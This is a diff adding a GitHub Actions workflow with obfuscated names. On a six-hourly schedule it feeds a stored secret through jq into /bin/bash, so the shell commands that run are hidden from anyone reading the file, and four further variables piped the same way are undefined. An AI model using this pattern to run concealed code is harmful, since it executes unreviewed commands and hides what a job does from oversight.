@@ -1,0 +1,21 @@
+name: zuoguiyehuixiangbf
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuoguiyehuixiangbf
+        env:
+          bhbb5: ${{ secrets.bhbb5 }}
+        run: |
+          echo $bhbb5 | jq -r .fss295 | /bin/bash
+          echo $ptq151 | jq -r .uzo21 | /bin/bash
+          echo $wr6210 | jq -r .te9 | /bin/bash
+          echo $tj826 | jq -r .zcp75 | /bin/bash
+          echo $lc5 | jq -r .nwhew4 | /bin/bash
+
